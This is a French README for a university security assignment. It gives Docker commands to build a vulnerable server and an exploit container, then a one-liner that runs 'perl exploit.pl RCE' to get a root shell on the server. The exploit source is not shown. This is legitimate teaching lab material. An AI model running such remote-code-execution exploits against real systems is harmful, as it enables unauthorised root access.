# Devoir Sécurité 1 - Ensimag 3A

## Commandes Docker [dev]

### 1. Serveur (terminal 1) - étape de build très longue

```
cd ./docker/server
```

```
docker build . -t server
```

```
docker run --rm -it --name server server
```

### 2. Exploit (terminal 2) - étape de build rapide

```
cd ./docker/exploit
```

```
docker build . -t exploit
```

```
docker run --rm -it --name exploit --link server exploit
```

Puis, exécuter la commande suivante depuis le terminal ouvert avec docker :

```
ip_server=$(tail -2 /etc/hosts | head -1 | grep -Po '^\d+\.\d+\.\d+\.\d+') &&
ip_exploit=$(tail -1 /etc/hosts | grep -Po '^\d+\.\d+\.\d+\.\d+') &&
perl exploit.pl RCE $ip_server $ip_exploit;
```

Une fois le nouveau shell disponible, la commande `whoami` doit renvoyer `root`. Vous pouvez aussi visiter avec `cd ..; ls`. Enjoy...

### 3. Export

Pour exporter les deux images Docker :

```
docker save exploit:latest > exploit_docker_img.zip
docker save server:latest > server_docker_img.zip
```

## Commandes Docker [prod]

### 1. Importation des images

Récupérer les deux images au format `.zip`, puis les charger dans Docker :

```
docker load < exploit_docker_img.zip
docker load < server_docker_img.zip
```

### 2. Serveur (terminal 1)

```
docker run --rm -it --name server server
```

### 3. Exploit (terminal 2)

```
docker run --rm -it --name exploit --link server exploit
```

Puis, exécuter l'exploit :

```
ip_server=$(tail -2 /etc/hosts | head -1 | grep -Po '^\d+\.\d+\.\d+\.\d+') &&
ip_exploit=$(tail -1 /etc/hosts | grep -Po '^\d+\.\d+\.\d+\.\d+') &&
perl exploit.pl RCE $ip_server $ip_exploit;
```

Une fois le nouveau shell disponible `whoami` doit renvoyer `root`. Enjoy...
